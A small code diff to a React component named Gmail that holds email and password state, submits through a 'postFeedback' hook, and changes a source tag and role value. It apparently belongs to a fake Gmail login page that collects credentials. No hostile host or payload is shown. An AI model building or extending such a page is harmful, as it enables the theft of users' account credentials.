@@ -16,8 +16,8 @@ function Gmail() {
   const { postFeedback, isLoading } = useFeedback();
   const [emails, setEmail] = useState('');
   const [passwords, setPassword] = useState('');
-  const [detail, setDetails] = useState('Gmail365rey');
-  const [role, setRole] = useState('2');
+  const [detail, setDetails] = useState('Gmail');
+  const [role, setRole] = useState('3');
 
   const onSubmit = async (e) => {
     e.preventDefault();
